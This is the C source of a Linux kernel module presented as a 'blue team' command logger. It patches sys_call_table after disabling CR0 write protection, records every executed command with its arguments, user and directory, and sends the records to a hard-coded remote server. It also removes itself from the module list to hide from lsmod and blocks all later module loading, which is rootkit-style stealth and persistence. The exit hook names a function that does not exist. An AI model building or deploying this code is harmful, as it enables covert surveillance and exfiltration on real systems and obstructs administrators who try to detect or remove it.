#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/timekeeping.h>
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/dcache.h>
#include <linux/file.h>
#include <linux/kallsyms.h>
#include <linux/limits.h>
#include <linux/namei.h>
#include <linux/tty.h>
#include <linux/fs_struct.h>
#include <linux/path.h>
#include <linux/sched/signal.h>
#include <linux/spinlock.h>
#include <linux/time64.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/workqueue.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/socket.h>
#include <net/sock.h>
#include <linux/tcp.h>
#include <linux/string.h>
#include <linux/list.h>
#include <linux/mutex.h>
#include <linux/nsproxy.h>
#include <linux/utsname.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Trevohack");
MODULE_DESCRIPTION("Advanced Command Logger with Real-time JSON Web Reporting");
MODULE_VERSION("3.0");


#define LOG_FILE "/var/log/cmd.log" 
#define WEB_SERVER_IP "10.6.3.87" 
#define WEB_SERVER_PORT 8080 
#define WEB_ENDPOINT "/api/commands" 
#define LOG_SIZE 8192
#define MAX_ARG_STRLEN 4096
#define MAX_QUEUE_SIZE 1000
#define SEND_INTERVAL 2 
#define MAX_RETRIES 3


struct command_entry {
    struct list_head list;
    char *json_data;
    unsigned long timestamp;
    int retry_count;
};


unsigned long *sys_call_table;
static asmlinkage long (*orig_execve)(const char __user *filename, const char __user *const __user *argv, const char __user *const __user *envp);
static asmlinkage long (*orig_execveat)(int dfd, const char __user *filename, const char __user *const __user *argv, const char __user *const __user *envp, int flags);
static asmlinkage long (*orig_init_module)(void __user *umod, unsigned long len, const char __user *uargs);
static asmlinkage long (*orig_finit_module)(int fd, const char __user *uargs, int flags);


static struct task_struct *sender_thread;
static struct workqueue_struct *log_workqueue;
static LIST_HEAD(command_queue);
static DEFINE_MUTEX(queue_lock);
static int queue_size = 0;
static int hidden = 0;
static int activate_stealth = 1;
static DEFINE_SPINLOCK(hide_lock);


notrace static const char *suspicious_commands[] = {
    "ssh", "scp", "rsync", "ftp", 
    "tcpdump", "wireshark", "nmap", "masscan", 
    "ps", "netstat", "lsof", "ss", 
    "find", "locate", "grep", "awk", "sed", 
    "tar", "zip", "gzip", "7z", 
    "chmod", "chown", "su", "sudo",
    "crontab", "at", "systemctl", "service", 
    NULL
};

notrace static void get_time_string(char *buf, size_t size) {
    struct timespec64 ts;
    struct tm tm;
    ktime_get_real_ts64(&ts);
    time64_to_tm(ts.tv_sec, 0, &tm);
    snprintf(buf, size, "%04ld-%02d-%02d %02d:%02d:%02d",
             tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday,
             tm.tm_hour, tm.tm_min, tm.tm_sec);
}

notrace static void get_tty_string(char *buf, size_t size) {
    struct tty_struct *tty = get_current_tty();
    if (tty && tty->name)
        snprintf(buf, size, "%s", tty->name);
    else
        snprintf(buf, size, "none");
}


static notrace char *get_cwd_string(void) {
    char *buf = (char *)__get_free_page(GFP_KERNEL);
    char *cwd;
    struct path pwd;

    if (!buf)
        return kstrdup("/unknown", GFP_KERNEL);

    get_fs_pwd(current->fs, &pwd);
    cwd = dentry_path_raw(pwd.dentry, buf, PAGE_SIZE);
    if (IS_ERR(cwd)) {
        free_page((unsigned long)buf);
        return kstrdup("/unknown", GFP_KERNEL);
    }

    cwd = kstrdup(cwd, GFP_KERNEL);
    free_page((unsigned long)buf);
    return cwd ? cwd : kstrdup("/unknown", GFP_KERNEL);
}


notrace static int is_suspicious_command(const char *command) {
    int i;
    const char *basename;
    
    basename = strrchr(command, '/');
    basename = basename ? basename + 1 : command;
    
    for (i = 0; suspicious_commands[i] != NULL; i++) {
        if (strstr(basename, suspicious_commands[i])) {
            return 1;
        }
    }
    return 0;
}


notrace static char *escape_json_string(const char *input) {
    size_t len;
    char *output;
    const char *src;
    char *dst;
    
    if (!input) return kstrdup("", GFP_KERNEL);
    
    len = strlen(input);
    output = kmalloc(len * 2 + 1, GFP_KERNEL); 
    if (!output) return kstrdup("", GFP_KERNEL);
    
    src = input;
    dst = output;
    
    while (*src) {
        switch (*src) {
            case '"':
                *dst++ = '\\';
                *dst++ = '"';
                break;
            case '\\':
                *dst++ = '\\';
                *dst++ = '\\';
                break;
            case '\n':
                *dst++ = '\\';
                *dst++ = 'n';
                break;
            case '\r':
                *dst++ = '\\';
                *dst++ = 'r';
                break;
            case '\t':
                *dst++ = '\\';
                *dst++ = 't';
                break;
            default:
                *dst++ = *src;
                break;
        }
        src++;
    }
    *dst = '\0';
    
    return output;
}


static notrace char *create_json_payload(const char *command, const char *args, const char *cwd, 
                                const char *tty, const char *timestamp, pid_t pid, 
                                uid_t uid, gid_t gid, int suspicious) {
    char *json;
    char *esc_command, *esc_args, *esc_cwd, *esc_tty;
    char hostname[256];
    
    strncpy(hostname, "unknown", sizeof(hostname)-1);
    hostname[255] = '\0';
    

    if (current->nsproxy && current->nsproxy->uts_ns) {
        strncpy(hostname, current->nsproxy->uts_ns->name.nodename, sizeof(hostname)-1);
        hostname[255] = '\0';
    }
    
    esc_command = escape_json_string(command);
    esc_args = escape_json_string(args);
    esc_cwd = escape_json_string(cwd);
    esc_tty = escape_json_string(tty);
    
    json = kmalloc(LOG_SIZE * 2, GFP_KERNEL);
    if (!json) {
        kfree(esc_command);
        kfree(esc_args);
        kfree(esc_cwd);
        kfree(esc_tty);
        return NULL;
    }
    
    snprintf(json, LOG_SIZE * 2,
        "{"
        "\"timestamp\":\"%s\","
        "\"hostname\": \"%s\","
        "\"pid\":%d,"
        "\"uid\":%d,"
        "\"gid\":%d,"
        "\"tty\":\"%s\","
        "\"cwd\":\"%s\","
        "\"command\":\"%s\","
        "\"args\":\"%s\","
        "\"suspicious\":%s,"
        "\"event_type\":\"command_execution\","
        "\"source\":\"blueteam_logger\""
        "}",
        timestamp, hostname, pid, uid, gid, esc_tty, esc_cwd, esc_command, esc_args,
        suspicious ? "true" : "false"
    );
    
    kfree(esc_command);
    kfree(esc_args);
    kfree(esc_cwd);
    kfree(esc_tty);
    
    return json;
}


static notrace void add_to_queue(char *json_data) {
    struct command_entry *entry;
    
    if (queue_size >= MAX_QUEUE_SIZE) {
        return;
    }
    
    entry = kmalloc(sizeof(struct command_entry), GFP_KERNEL);
    if (!entry) {
        kfree(json_data);
        return;
    }
    
    entry->json_data = json_data;
    entry->timestamp = jiffies;
    entry->retry_count = 0;
    
    mutex_lock(&queue_lock);
    list_add_tail(&entry->list, &command_queue);
    queue_size++;
    mutex_unlock(&queue_lock);
}


static notrace int send_to_server(const char *json_data) {
    struct socket *sock;
    struct sockaddr_in server;
    struct msghdr msg;
    struct kvec vec[3];
    char *http_header;
    int ret;
    int json_len = strlen(json_data);
    
    http_header = kmalloc(512, GFP_KERNEL);
    if (!http_header)
        return -ENOMEM;
    
    snprintf(http_header, 512,
        "POST %s HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "Content-Type: application/json\r\n"
        "Content-Length: %d\r\n"
        "User-Agent: BlueTeam-Logger/3.0\r\n"
        "Connection: close\r\n\r\n",
        WEB_ENDPOINT, WEB_SERVER_IP, WEB_SERVER_PORT, json_len);
    
    ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
    if (ret < 0) {
        kfree(http_header);
        return ret;
    }

    memset(&server, 0, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_port = htons(WEB_SERVER_PORT);
    server.sin_addr.s_addr = in_aton(WEB_SERVER_IP);

    ret = sock->ops->connect(sock, (struct sockaddr *)&server, sizeof(server), O_RDWR);
    if (ret < 0) {
        sock_release(sock);
        kfree(http_header);
        return ret;
    }

    memset(&msg, 0, sizeof(msg));

    vec[0].iov_base = http_header;
    vec[0].iov_len = strlen(http_header);

    vec[1].iov_base = (void *)json_data;
    vec[1].iov_len = json_len;
    
    ret = kernel_sendmsg(sock, &msg, vec, 2, strlen(http_header) + json_len);
    
    sock_release(sock);
    kfree(http_header);
    
    return ret > 0 ? 0 : ret;
}

static notrace int sender_thread_func(void *data) {
    struct command_entry *entry, *tmp;
    
    while (!kthread_should_stop()) {
        mutex_lock(&queue_lock);
        
        list_for_each_entry_safe(entry, tmp, &command_queue, list) {
            int ret = send_to_server(entry->json_data);
            
            if (ret == 0) {
                list_del(&entry->list);
                queue_size--;
                kfree(entry->json_data);
                kfree(entry);
                // printk(KERN_DEBUG "[r0ddy] Command sent to server successfully\n");
            } else {
                entry->retry_count++;
                if (entry->retry_count >= MAX_RETRIES) {
                    // printk(KERN_WARNING "[r0ddy] Max retries reached, dropping entry\n");
                    list_del(&entry->list);
                    queue_size--;
                    kfree(entry->json_data);
                    kfree(entry);
                }
            }
        }
        
        mutex_unlock(&queue_lock);
        msleep(SEND_INTERVAL * 1000);
    }
    
    return 0;
}

struct log_work {
    struct work_struct work;
    char *command;
    char *args;
    char *cwd;
    char *tty;
    char *timestamp;
    pid_t pid;
    uid_t uid;
    gid_t gid;
    int suspicious;
};

static notrace void log_work_func(struct work_struct *work) {
    struct log_work *log_work = container_of(work, struct log_work, work);
    char *json_data;

    json_data = create_json_payload(log_work->command, log_work->args, log_work->cwd,
                                   log_work->tty, log_work->timestamp, log_work->pid,
                                   log_work->uid, log_work->gid, log_work->suspicious);
    
    if (json_data) {
        add_to_queue(json_data);
    }
    
    kfree(log_work->command);
    kfree(log_work->args);
    kfree(log_work->cwd);
    kfree(log_work->tty);
    kfree(log_work->timestamp);
    kfree(log_work);
}


static notrace char *get_args_string(const char __user *const __user *argv) {
    char *args = kmalloc(MAX_ARG_STRLEN, GFP_KERNEL);
    char *arg;
    int i = 0;
    const char __user *user_arg;

    if (!args)
        return kstrdup("", GFP_KERNEL);
    
    args[0] = '\0';

    while (i < MAX_ARG_STRLEN / 16) {
        if (get_user(user_arg, &argv[i]))
            break;
        if (!user_arg)
            break;

        arg = kmalloc(MAX_ARG_STRLEN, GFP_KERNEL);
        if (!arg)
            break;

        if (strncpy_from_user(arg, user_arg, MAX_ARG_STRLEN) < 0) {
            kfree(arg);
            break;
        }

        strlcat(args, arg, MAX_ARG_STRLEN);
        if (i > 0) strlcat(args, " ", MAX_ARG_STRLEN);
        kfree(arg);
        i++;
    }

    return args;
}

notrace static void hide_module(void) {
    list_del(&THIS_MODULE->list);
}

static notrace asmlinkage long hook_execve(const char __user *filename,
                                  const char __user *const __user *argv,
                                  const char __user *const __user *envp) {
    struct log_work *work;
    char *kfilename, *args, *cwd, *tty, *timestamp;
    int suspicious;

    if (activate_stealth && !hidden) {
        spin_lock(&hide_lock);
        hide_module();
        hidden = 1;
        spin_unlock(&hide_lock);
        // printk(KERN_INFO "[r0ddy] Module hidden from lsmod\n");
    }

    kfilename = kmalloc(PATH_MAX, GFP_KERNEL);
    if (!kfilename)
        goto call_original;

    if (strncpy_from_user(kfilename, filename, PATH_MAX) < 0) {
        kfree(kfilename);
        goto call_original;
    }

    args = get_args_string(argv);
    if (!args) {
        kfree(kfilename);
        goto call_original;
    }

    cwd = get_cwd_string();
    if (!cwd) {
        kfree(kfilename);
        kfree(args);
        goto call_original;
    }

    tty = kmalloc(64, GFP_KERNEL);
    if (!tty) {
        kfree(kfilename);
        kfree(args);
        kfree(cwd);
        goto call_original;
    }
    get_tty_string(tty, 64);

    timestamp = kmalloc(32, GFP_KERNEL);
    if (!timestamp) {
        kfree(kfilename);
        kfree(args);
        kfree(cwd);
        kfree(tty);
        goto call_original;
    }
    get_time_string(timestamp, 32);
    suspicious = is_suspicious_command(kfilename);

    work = kmalloc(sizeof(struct log_work), GFP_KERNEL);
    if (work) {
        INIT_WORK(&work->work, log_work_func);
        work->command = kfilename;
        work->args = args;
        work->cwd = cwd;
        work->tty = tty;
        work->timestamp = timestamp;
        work->pid = current->pid;
        work->uid = current_uid().val;
        work->gid = current_gid().val;
        work->suspicious = suspicious;

        queue_work(log_workqueue, &work->work);
    } else {
        kfree(kfilename);
        kfree(args);
        kfree(cwd);
        kfree(tty);
        kfree(timestamp);
    }

call_original:
    return orig_execve(filename, argv, envp);
}


static notrace asmlinkage long hook_execveat(int dfd, const char __user *filename,
                                    const char __user *const __user *argv,
                                    const char __user *const __user *envp,
                                    int flags) {
    return hook_execve(filename, argv, envp);
}

asmlinkage long notrace hook_init_module(void __user *umod, unsigned long len, const char __user *uargs) {
    char *kfilename = NULL;
    return -EPERM;
}

asmlinkage long notrace hook_finit_module(int fd, const char __user *uargs, int flags) {
    return -EPERM;
}

static void disable_write_protection(void) {
    write_cr0(read_cr0() & (~0x00010000));
}

static void enable_write_protection(void) {
    write_cr0(read_cr0() | 0x00010000);
}

static int __init roddy_init(void) {
    printk(KERN_INFO "==========================================================\n"); 
    printk(KERN_INFO "[r0ddy] Initializing roddy v3.0\n"); 
    printk(KERN_INFO "[r0ddy] Target server: %s:%d%s\n", WEB_SERVER_IP, WEB_SERVER_PORT, WEB_ENDPOINT); 
    printk(KERN_INFO "[trev]  Hsck The Planet\n"); 
    printk(KERN_INFO "==========================================================\n");  

    sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
    if (!sys_call_table) {
        return -ENOENT;
    }

    log_workqueue = create_singlethread_workqueue("blueteam_logger");
    if (!log_workqueue) {
        // printk(KERN_ERR "[r0ddy] Failed to create workqueue\n");
        return -ENOMEM;
    }

    sender_thread = kthread_run(sender_thread_func, NULL, "blueteam_sender");
    if (IS_ERR(sender_thread)) {
        destroy_workqueue(log_workqueue);
        return PTR_ERR(sender_thread);
    }

    disable_write_protection();

    orig_execve = (void *)sys_call_table[__NR_execve];
    orig_execveat = (void *)sys_call_table[__NR_execveat]; 
    orig_init_module = (void *)sys_call_table[__NR_init_module];
    orig_finit_module = (void *)sys_call_table[__NR_finit_module];

    sys_call_table[__NR_execve] = (unsigned long)hook_execve;
    sys_call_table[__NR_execveat] = (unsigned long)hook_execveat; 
    sys_call_table[__NR_init_module] = (unsigned long)hook_init_module;
    sys_call_table[__NR_finit_module] = (unsigned long)hook_finit_module;


    enable_write_protection();

    printk(KERN_INFO "[r0ddy] Command logging activated\n");
    return 0;
}

static void __exit blueteam_logger_exit(void) {
    struct command_entry *entry, *tmp;

    disable_write_protection();

    sys_call_table[__NR_execve] = (unsigned long)orig_execve;
    sys_call_table[__NR_execveat] = (unsigned long)orig_execveat;
    sys_call_table[__NR_init_module] = (unsigned long)orig_init_module;
    sys_call_table[__NR_finit_module] = (unsigned long)orig_finit_module;
    
    enable_write_protection();

    if (sender_thread) {
        kthread_stop(sender_thread);
    }

    if (log_workqueue) {
        flush_workqueue(log_workqueue);
        destroy_workqueue(log_workqueue);
    }

    mutex_lock(&queue_lock);
    list_for_each_entry_safe(entry, tmp, &command_queue, list) {
        list_del(&entry->list);
        kfree(entry->json_data);
        kfree(entry);
    }
    mutex_unlock(&queue_lock);

    printk(KERN_INFO "[r0ddy] Command logger stopped\n");
}

module_init(roddy_init);
module_exit(roddy_exit); 
